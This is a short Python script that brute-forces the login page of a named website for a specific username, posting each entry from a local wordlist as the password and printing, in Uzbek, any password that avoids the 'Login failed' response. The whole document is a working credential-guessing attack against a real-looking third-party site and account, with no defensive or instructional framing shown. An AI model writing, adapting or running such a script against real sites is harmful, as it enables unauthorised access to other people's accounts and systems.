import requests

target_url = "https://apro.uz/Account/Login?ReturnUrl=%2FHome%2FMain"

data_dict = {"username": "p00194517", "password": "p00194517", "Login": "submit"}

response = requests.post(target_url, data_dict)

with open("/home/kali/Downloads/subdomains100.txt") as word_list:
    for line in word_list:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if b"Login failed" not in response.content:
            print("[+]Parol topildi > " + word)
            exit()

print("[+]hamma parollar testdan o'tkazildi parol topilmadi")
